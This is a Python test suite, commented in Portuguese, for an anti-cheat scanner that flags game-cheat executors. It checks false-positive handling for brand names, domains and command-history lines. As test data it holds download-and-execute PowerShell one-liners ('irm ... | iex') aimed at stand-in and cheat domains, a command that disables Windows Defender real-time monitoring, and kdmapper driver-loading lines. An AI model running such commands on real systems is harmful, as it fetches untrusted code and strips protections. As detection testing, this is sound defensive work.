"""
Regressão de FALSOS POSITIVOS por colisão de marca/produto.

Auditoria encontrou keywords de palavra-única que colidiam com marcas
legítimas — flagando software/conteúdo inocente como executor (HIGH!):
  - "synapse"  → Razer Synapse (software de mouse, milhões de PCs)
  - "ronix"    → Ronix (marca de wakeboard)
  - "valex"    → Valex (marca de cabos)

Corrigido removendo a palavra solta e mantendo variantes específicas
(.exe / "x executor" / domínios). Estes testes garantem que:
  1. As colisões NÃO disparam mais.
  2. Os executores REAIS continuam detectados pelas variantes.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import matching  # noqa: E402


def setup_module(_):
    matching.invalidate()


# Termos LEGÍTIMOS que colidiam — não podem casar
BRAND_COLLISIONS = [
    "razer synapse",
    "razersynapse.exe",
    "RazerSynapse.exe-A1B2C3D4.pf",
    "C:\\Program Files\\Razer\\Synapse3\\RazerSynapse.exe",
    "ronix wakeboard 2024",
    "ronix bindings",
    "ronix wake",
    "valex cables",
    "valex electronics",
]


def test_brand_collisions_do_not_false_positive():
    for t in BRAND_COLLISIONS:
        kw, sev = matching.match_keyword(t)
        assert kw is None, f"FALSO POSITIVO de marca: {t!r} casou com {kw!r} ({sev})"


# Executores REAIS que precisam continuar sendo detectados (via variantes)
EXECUTOR_VARIANTS = [
    ("synapse x", "synapse x"),
    ("synapsex", "synapsex"),
    ("SYNAPSE.EXE-A1B2C3D4.pf", "synapse.exe"),   # Prefetch-style
    ("synapse.exe", "synapse.exe"),
    ("ronix executor", "ronix executor"),
    ("RONIX.EXE-5678.pf", "ronix.exe"),
    ("ronix.cc", "ronix.cc"),
    ("valex executor", "valex executor"),
    ("VALEX.EXE-1234.pf", "valex.exe"),
]


def test_executors_still_detected_via_variants():
    for text, expected in EXECUTOR_VARIANTS:
        kw, sev = matching.match_keyword(text)
        assert kw == expected, f"{text!r} -> {kw!r} (esperado {expected!r}) — perdeu cobertura"
        assert sev == "high"


# ----- Domínio: substring de domínio maior NÃO pode casar -----

def test_domain_boundary_no_substring_fp():
    """wave.gg não pode casar soundwave.gg etc. (era FP de substring)."""
    cases_no = [
        ("wave.gg", "soundwave.gg/music"),
        ("wave.cc", "heatwave.cc"),
        ("wave.dev", "mywave.dev"),
        ("sense.gg", "nonsense.gg"),
        ("coral.gg", "mycoral.gg"),
    ]
    for dom, text in cases_no:
        assert not matching.domain_in_text(dom, text), \
            f"FP de domínio: {dom!r} casou {text!r}"


def test_domain_boundary_real_domains_match():
    """Domínio real e subdomínio legítimo DEVEM casar."""
    cases_yes = [
        ("wave.gg", "wave.gg"),
        ("wave.gg", "https://wave.gg/download"),
        ("wave.gg", "data.wave.gg"),        # subdomínio real
        ("solara.cc", "baixou de solara.cc hoje"),
        ("xeno.now", "sub.xeno.now"),
    ]
    for dom, text in cases_yes:
        assert matching.domain_in_text(dom, text), \
            f"perdeu match de domínio: {dom!r} em {text!r}"


# ----- word_in_text: fronteira de palavra para listas de substring -----

def test_word_in_text_boundary():
    assert matching.word_in_text("wipe", "wipe.exe")
    assert matching.word_in_text("shred", "shred.exe")
    assert not matching.word_in_text("wipe", "swipe.exe")     # era FP
    assert not matching.word_in_text("shred", "shredder pics")  # era FP


# ----- command_history não pode bypassar o matching central -----

def test_command_history_uses_central_matching():
    """command_history fazia substring de EXECUTOR_KEYWORDS/SUSPICIOUS_DOMAINS,
    bypassando word-boundary. Agora usa o matching central — sem FP."""
    import command_history as ch
    # FPs que o substring causava:
    assert ch._match_in_line("cd C:/solarapanel/docs")[0] is None
    assert ch._match_in_line("visited soundwave.gg yesterday")[0] is None
    # detecção real preservada:
    assert ch._match_in_line("run solara.exe")[0] is not None
    kw, sev = ch._match_in_line("iex(downloadstring https://solara.cc/x)")
    assert kw is not None and sev == "high"


# ----- v3.29.1: keyword dentro de regex de busca não é execução -----

def test_powershell_search_regex_not_flagged():
    """REGRESSÃO FP: `Where-Object -match 'winring0|kdmapper|gmer'` é AUDITORIA
    procurando esses tokens. Os tokens estão dentro de uma string de busca —
    não estão sendo executados."""
    import command_history as ch
    line = ("Get-CimInstance Win32_SystemDriver | Where-Object PathName "
            "-match 'winring0|mhyprot|capcom|gdrv|iqvw64|kdmapper|gmer' "
            "| Select-Object Name, State, PathName")
    kw, sev = ch._match_in_line(line)
    assert kw is None, f"FP: matched '{kw}' dentro de regex de busca"


def test_powershell_select_string_not_flagged():
    """Select-String 'kdmapper' = procurar log por kdmapper, não rodar kdmapper."""
    import command_history as ch
    kw, _ = ch._match_in_line("Get-Content log.txt | Select-String 'kdmapper'")
    assert kw is None


def test_powershell_findstr_not_flagged():
    """findstr "solara" arquivo.txt = grep, não execução."""
    import command_history as ch
    kw, _ = ch._match_in_line('findstr /c:"solara" suspeitos.txt')
    assert kw is None


def test_powershell_real_execution_still_flagged():
    """Não pode regredir: rodar de fato continua sendo detectado."""
    import command_history as ch
    # Sem verbo de busca, kdmapper na CLI = execução real
    assert ch._match_in_line(".\\kdmapper.exe driver.sys")[0] is not None
    assert ch._match_in_line("Start-Process kdmapper")[0] is not None
    # Mesmo com pipe, mas sem verbo de busca, é execução
    assert ch._match_in_line("kdmapper | tee log.txt")[0] is not None


def test_powershell_search_pattern_helper():
    """Núcleo da heurística — testes mínimos."""
    import command_history as ch
    # Regex enumeration ao redor do keyword
    assert ch._is_search_pattern(
        "Where-Object -match 'a|kdmapper|b'", "kdmapper") is True
    # Literal entre aspas com verbo de busca
    assert ch._is_search_pattern("Select-String 'kdmapper'", "kdmapper") is True
    # Sem verbo de busca = não é
    assert ch._is_search_pattern("kdmapper.exe driver", "kdmapper") is False
    # Verbo de busca mas keyword fora da regex = não é (caso raro)
    assert ch._is_search_pattern(
        "kdmapper; Where-Object -match 'algo'", "kdmapper") is False


# ===== FP: lista de assinatura (script anti-cheat / o próprio Telador) =====

def test_signature_list_assignment_not_flagged():
    """REGRESSÃO FP: `$cheat = 'solara|xeno|...'` é a WORDLIST de um script de
    screenshare/anti-cheat (ou do próprio Telador) caindo no PS history — não
    é cheat rodando. Sem verbo de busca, o _is_search_pattern não pegava."""
    import command_history as ch
    line = ("$cheat = 'solara|xeno|wave|krnl|fluxus|velocity|ronix|synapse|"
            "swift|celery|hydrogen|delta|arceus|codex|seliware|comet|trigon|"
            "awp|macsploit|exploit|injector|executor|loader|bootstrap'")
    kw, sev = ch._match_in_line(line)
    assert kw is None, f"FP: lista de assinatura casou '{kw}' ({sev})"


def test_signature_list_helper():
    """Núcleo: precisa de ALTERNÂNCIA real (≥2 pipes) E ≥3 executores distintos."""
    import command_history as ch
    assert ch._is_signature_list("'solara|krnl|fluxus'") is True
    # Um executor só, mesmo com pipe (pipeline real), NÃO é lista
    assert ch._is_signature_list("krnl | tee log.txt") is False
    # Sem pipe nenhum, não é lista
    assert ch._is_signature_list("run solara.exe") is False
    # FN evitado: 3 executores rodados de fato (separados por ;) com 1 pipe
    # não-relacionado NÃO é wordlist — só 1 pipe, não é alternância.
    assert ch._is_signature_list("solara.exe; krnl.exe; fluxus.exe | tee log") is False


def test_multiple_executors_semicolon_still_flagged():
    """Não pode regredir: rodar vários executores (;) com 1 pipe solto é execução
    real, tem que acender."""
    import command_history as ch
    assert ch._match_in_line("solara.exe; krnl.exe; fluxus.exe | tee log")[0] is not None


def test_single_executor_still_flagged_despite_pipe():
    """Não pode regredir: rodar UM executor com pipe continua detectado."""
    import command_history as ch
    assert ch._match_in_line("solara.exe | tee log.txt")[0] is not None
    assert ch._match_in_line(".\\krnl.exe")[0] is not None


# ===== FP: download+exec de domínio CONFIÁVEL (allowlist) =====
# TRUSTED_DOMAINS nasce VAZIO (só popula de trusted_domains.json local), então
# os testes injetam um domínio sintético e limpam depois — herméticos, não
# dependem do arquivo local existir.

_TRUSTED_TEST_DOMAIN = "allowlisted.test"


def _with_trusted(fn):
    """Roda fn() com _TRUSTED_TEST_DOMAIN na allowlist e limpa no fim."""
    import database
    database.TRUSTED_DOMAINS.add(_TRUSTED_TEST_DOMAIN)
    try:
        fn()
    finally:
        database.TRUSTED_DOMAINS.discard(_TRUSTED_TEST_DOMAIN)


def test_trusted_domain_irm_iex_not_flagged():
    """REGRESSÃO FP: `irm "https://<confiável>/..." | iex` é instalador legítimo
    do dono (steamtools). irm/iex são HIGH sozinhos, mas vindo de domínio
    confiável não é flag."""
    import command_history as ch
    def check():
        assert ch._match_in_line(
            f'irm "https://{_TRUSTED_TEST_DOMAIN}/install-plugin.ps1" | iex')[0] is None
        assert ch._match_in_line(
            f'iex (irm https://{_TRUSTED_TEST_DOMAIN}/install-plugin-legacy.ps1)')[0] is None
    _with_trusted(check)


def test_trusted_domain_does_not_clear_independent_redflag():
    """Domínio confiável só limpa download/exec — red flag INDEPENDENTE (bypass
    de Defender) na mesma linha continua acendendo."""
    import command_history as ch
    def check():
        kw, sev = ch._match_in_line(
            f'irm https://{_TRUSTED_TEST_DOMAIN}/x | iex; '
            'Set-MpPreference -DisableRealtimeMonitoring $true')
        assert kw is not None and sev == "high"
    _with_trusted(check)


def test_untrusted_domain_irm_iex_still_flagged():
    """Não pode regredir: irm|iex de domínio qualquer (não-allowlist) continua HIGH."""
    import command_history as ch
    kw, sev = ch._match_in_line('irm "https://rando.example/x.ps1" | iex')
    assert kw is not None and sev == "high"


def test_trusted_domains_disclosed_in_report(monkeypatch):
    """SEGURANÇA: allowlist ativa tem que aparecer no report (meta_only) — senão
    um trusted_domains.json plantado pelo suspeito suprimiria em silêncio."""
    import command_history as ch, database
    # Hermético: força candidates sem arquivo existente (o sidecar de dev pode
    # estar no disco da máquina de quem roda o teste, contaminaria o cenário)
    monkeypatch.setattr(database, "_trusted_domains_candidates", lambda: [])
    saved = set(database.TRUSTED_DOMAINS)
    database.TRUSTED_DOMAINS.clear()
    try:
        r = ch.scan_trusted_domains_notice()
        assert r["items"] == [] and r["status"] == "clean"
        # Com domínio -> item meta_only visível, mas não acende veredito
        database.TRUSTED_DOMAINS.add(_TRUSTED_TEST_DOMAIN)
        r = ch.scan_trusted_domains_notice()
        assert len(r["items"]) == 1
        assert r["items"][0]["meta_only"] is True
        assert _TRUSTED_TEST_DOMAIN in r["items"][0]["detail"]
        assert "4104" in r["items"][0]["detail"]  # explicita afetar winevent
        assert r["status"] == "clean"  # meta_only não marca suspeito
        # E o SUMMARY tem que bater com o status — não pode dizer "suspeito"
        # quando só tem item meta_only (era UX bug do _result).
        assert "suspeito" not in r["summary"].lower()
    finally:
        database.TRUSTED_DOMAINS.clear()
        database.TRUSTED_DOMAINS.update(saved)


def test_trusted_domains_localappdata_fallback(tmp_path, monkeypatch):
    """LOCALAPPDATA é candidato de fallback (mesmo padrão do signatures.json):
    permite o dono dropar o arquivo UMA vez e funcionar de qualquer exe.
    Esperado APÓS env e sidecar — não substitui os canais primários."""
    import database as db
    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path))
    monkeypatch.delenv("TELADOR_TRUSTED_DOMAINS", raising=False)
    cands = db._trusted_domains_candidates()
    expected = str(tmp_path / "Telador" / "trusted_domains.json")
    assert expected in cands
    # Ordem: LOCALAPPDATA vem DEPOIS do sidecar (primary > fallback)
    assert cands.index(expected) > 0


def test_trusted_domains_userprofile_fallback(tmp_path, monkeypatch):
    """USERPROFILE\\AppData\\Local é fallback redundante pro caso de LOCALAPPDATA
    unset (contexto de exe elevado anomalo, env truncado etc)."""
    import database as db
    monkeypatch.delenv("LOCALAPPDATA", raising=False)
    monkeypatch.delenv("APPDATA", raising=False)
    monkeypatch.setenv("USERPROFILE", str(tmp_path))
    monkeypatch.delenv("TELADOR_TRUSTED_DOMAINS", raising=False)
    cands = db._trusted_domains_candidates()
    expected = str(tmp_path / "AppData" / "Local" / "Telador" / "trusted_domains.json")
    assert expected in cands


def test_disclosure_diagnoses_broken_config(tmp_path, monkeypatch):
    """Se trusted_domains.json existe mas TRUSTED_DOMAINS está vazio (JSON
    malformado etc), o disclosure scanner tem que GRITAR — não ficar 'ok'
    silencioso. Senão o dono dropa o arquivo, não vê efeito e fica adivinhando."""
    import command_history as ch, database, os as _os
    saved = set(database.TRUSTED_DOMAINS)
    database.TRUSTED_DOMAINS.clear()
    # Cria um arquivo malformado no LOCALAPPDATA simulado
    monkeypatch.setenv("LOCALAPPDATA", str(tmp_path))
    monkeypatch.delenv("TELADOR_TRUSTED_DOMAINS", raising=False)
    bad = tmp_path / "Telador" / "trusted_domains.json"
    bad.parent.mkdir(parents=True)
    bad.write_text("{ isto nao e lista valida }", encoding="utf-8")
    try:
        r = ch.scan_trusted_domains_notice()
        assert len(r["items"]) == 1
        assert r["items"][0]["meta_only"] is True
        assert "broken" in r["items"][0]["matched"]
        assert str(bad) in r["items"][0]["detail"]
        assert r["status"] == "clean"  # meta_only, não acende veredito
    finally:
        database.TRUSTED_DOMAINS.clear()
        database.TRUSTED_DOMAINS.update(saved)


def test_disclosure_silent_when_truly_empty(monkeypatch):
    """Quando NÃO HÁ arquivo em LUGAR nenhum, disclosure fica silencioso (o caso
    normal do user que nem configurou). Sem ruído pra quem não usa a feature."""
    import command_history as ch, database
    monkeypatch.setattr(database, "_trusted_domains_candidates", lambda: [])
    saved = set(database.TRUSTED_DOMAINS)
    database.TRUSTED_DOMAINS.clear()
    try:
        r = ch.scan_trusted_domains_notice()
        assert r["items"] == []
        assert r["status"] == "clean"
    finally:
        database.TRUSTED_DOMAINS.clear()
        database.TRUSTED_DOMAINS.update(saved)


def test_result_summary_ignores_meta_only_items():
    """REGRESSÃO UX: _result deve computar status/summary baseado em itens REAIS
    (não-meta), senão um scanner que só emite header de contexto mente dizendo
    "N item(s) suspeito(s)" quando o status é clean. Também afeta scanners
    pré-existentes (live_analysis usa header [PROCESSO] meta_only)."""
    from models import _result, _item
    # Só meta_only -> clean + "Nenhum vestígio"
    only_meta = [_item("[CTX]", "ctx", "low", "x", meta_only=True)]
    r = _result("X", "d", only_meta)
    assert r["status"] == "clean"
    assert r["summary"] == "Nenhum vestígio encontrado"
    # Meta + real -> suspicious + conta SÓ os reais
    mix = [_item("[CTX]", "ctx", "low", "x", meta_only=True),
           _item("real", "d", "high", "y")]
    r = _result("X", "d", mix)
    assert r["status"] == "suspicious"
    assert r["summary"] == "1 item(s) suspeito(s)"
    # Só real -> mantém comportamento clássico
    real = [_item("a", "d", "high", "z")]
    r = _result("X", "d", real)
    assert r["status"] == "suspicious"
    assert r["summary"] == "1 item(s) suspeito(s)"


# ===== FP v3.38.1: bare folder names colidindo com software legítimo =====

def test_generic_folder_names_dont_match():
    """REGRESSÃO FP: SUSPICIOUS_FOLDER_NAMES casa o nome EXATO da pasta. Bare
    words genéricos colidiam com software legítimo cuja pasta tem esse nome:
      codex → OpenAI Codex · argon → Argon (Rojo) · electron → Electron
      hydrogen → Hydrogen (sequencer) · sentinel → Sentinel · cryptic → Cryptic Studios
    Visto na máquina do dev: pasta 'Codex' flaggava HIGH como executor."""
    from database import SUSPICIOUS_FOLDER_NAMES as S
    for name in ("codex", "argon", "electron", "hydrogen", "sentinel", "cryptic"):
        assert S.get(name) is None, f"'{name}' não devia estar em SUSPICIOUS_FOLDER_NAMES (FP)"


def test_removed_executors_still_covered():
    """Os executores removidos da lista de pastas continuam pegos por variantes
    específicas (process name / domínio / 'X executor')."""
    import matching
    from database import EXECUTOR_PROCESS_NAMES
    assert matching.match_keyword("codex.lol")[0] is not None
    assert matching.match_keyword("Codex Executor")[0] is not None
    assert EXECUTOR_PROCESS_NAMES.get("codex.exe") == "high"
    assert matching.match_keyword("argon executor")[0] is not None
    assert matching.match_keyword("electron exploit")[0] is not None
    assert matching.match_keyword("hydrogen.exe")[0] is not None
    assert matching.match_keyword("sentinel exploit")[0] is not None
    assert matching.match_keyword("cryptic exec")[0] is not None
